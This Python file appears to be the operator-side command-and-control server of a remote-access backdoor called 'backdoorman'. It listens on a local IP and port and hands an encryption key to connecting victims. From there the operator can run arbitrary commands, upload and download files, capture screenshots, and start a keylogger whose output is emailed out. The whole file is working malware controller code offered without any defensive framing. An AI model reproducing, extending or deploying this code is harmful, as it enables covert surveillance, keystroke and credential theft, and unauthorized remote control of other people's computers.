import json
import socket
import os
import time
import uuid
from cryptography.fernet import Fernet

HOST = "192.168.1.34"
PORT = 6666
BUFF = 1024


def _decode_(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437")
        except UnicodeDecodeError:
            return data.decode(errors="replace")


def createSocket():
    global objSocket
    try:
        objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as stderr:
        print(f"[-] Error creating socket {stderr}")


def socketBind():
    global objSocket
    try:
        print(f"[+] Running on IP: {HOST}")
        print(f"[+] Listening on PORT: {PORT}")
        objSocket.bind((HOST, PORT))
        objSocket.listen(100)
    except socket.error as stderr:
        print(f"[-] Error socket binding {stderr}. Retrying...")
        socketBind()


def socketAccept():
    global objSocket, objKey, conn, addr
    try:
        conn, addr = objSocket.accept()
        conn.setblocking(1)
        conn.send(objKey)
        info = json.loads(conn.recv(BUFF).decode())
        print(f"[+] Connected by {addr[0]}.")
        print(info)
    except socket.error as stderr:
        print(f"[-] Error accepting connection! {stderr}.")


def createEncryptor():
    global objKey, objEncryptor
    objKey = Fernet.generate_key()
    objEncryptor = Fernet(objKey)


def send(data): return conn.send(objEncryptor.encrypt(data))
def recv(buffer): return objEncryptor.decrypt(conn.recv(buffer))


def sendall(flag, data):
    # data comes here by already encoded
    intDataSize = len(objEncryptor.encrypt(data))
    send(f"{flag}{intDataSize}".encode())  # encryptor data must be byte
    time.sleep(0.2)
    send(data)
    print(f"[+] Total bytes sent: {intDataSize}")


def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += conn.recv(buffer)
    return objEncryptor.decrypt(bytData)


def sendFile():
    strFile = input("\n[!] File to Send: ")
    if not os.path.isfile(strFile):
        print("[-] Invalid File!")
        return

    strOutputFile = input("\n[!] Output File to Save: ")
    if strOutputFile == "":
        print("[-] Invalid Path!")
        return

    with open(strFile, "rb") as objFile:
        sendall("send", objFile.read())

    send(strOutputFile.encode())

    # sendall sends the size of the file so i am expecting the same size here
    intBuffer = int(recv(BUFF).decode())

    strClientResponse = recv(BUFF).decode()
    print(strClientResponse)


def receiveFile():
    strFile = input("\n[!] Target file: ")
    strFileOutput = input("\n[!] Output File: ")

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    send(("recv" + strFile).encode())
    strClientResponse = recv(BUFF).decode()

    if strClientResponse == "[-] Target file not found!":
        print(strClientResponse)
    else:
        print(f"[+] File size: {strClientResponse} bytes\n[+] Please wait...")
        intBuffer = int(strClientResponse)
    fileData = recvall(intBuffer)  # get data and write it

    try:
        with open(strFileOutput, "wb") as objFile:
            objFile.write(fileData)
    except:
        print("[-] Path is protected/invalid!")
        return

    print(
        f"[+] Done!\n[+] Total bytes received: {os.path.getsize(strFileOutput)} bytes")


def screenshot():
    send(b"screenshot")
    strSSSize = recv(BUFF).decode()
    print(
        f"\n[+] Receiving Screenshot\n[+] File size: {strSSSize} bytes\n[+] Please wait...")
    intBuffer = int(strSSSize)
    strFileName = uniqueNameCreator()
    ssData = recvall(intBuffer)
    with open(strFileName, "wb") as f:
        f.write(ssData)

    print(
        f"[+] Done!\n[+] Total bytes received: {os.path.getsize(strFileName)} bytes")


def uniqueNameCreator():
    uniqueName = str(uuid.uuid4()) + ".png"
    return uniqueName


def receiveInfoAsMail(tobesent):
    send(tobesent)
    responseSize = int(recv(BUFF).decode())
    response = recv(BUFF).decode()
    print(response)


def keylogger():
    print("[+] Keylogger is running...")
    send("keylogger".encode())
    newOrder = "start"
    while newOrder.lower() != "stop":
        if newOrder != "stop":
            print("[+] Keylogs are being sent to your email addres as text file.")
            print("[+] Please wait...")
            response = ""
            while True:
                response = recv(BUFF).decode()
                if response == "[+] Give an order(start/stop).":
                    print(response)
                    newOrder = input("\n>>")
                    send(newOrder.encode())
                    break


def run():
    while True:
        order = input("backdoorman>>")
        if order in ["exit", "quit"]:
            break
        elif order[:6] == "upload":
            sendFile()
        elif order[:8] == "download":
            receiveFile()
        elif order == "screenshot":
            screenshot()
        elif order[:4] == "mail":
            receiveInfoAsMail(order.encode())
        elif order == "keylogger":
            keylogger()
        elif len(order) > 0:
            send(order.encode())
            intBuffer = int(recv(BUFF).decode())
            strClientResponse = _decode_(recvall(intBuffer))
            print(strClientResponse)


def main():
    createEncryptor()
    createSocket()
    socketBind()
    socketAccept()
    run()


main()
